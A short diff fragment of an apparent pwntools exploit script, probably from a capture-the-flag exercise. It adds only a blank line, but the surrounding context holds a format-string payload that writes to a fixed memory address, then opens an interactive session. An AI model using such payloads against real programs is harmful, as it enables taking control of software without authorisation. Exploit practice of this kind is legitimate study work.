@@ -51,5 +51,6 @@ buf = b"%04199197d%8$lnA" + p64(0x404050) + b"\n"
 io.recvuntil(b"triggering the vulnerability:")
 io.sendline(buf)
 # io.sendline(b"END")
+
 io.interactive()
 
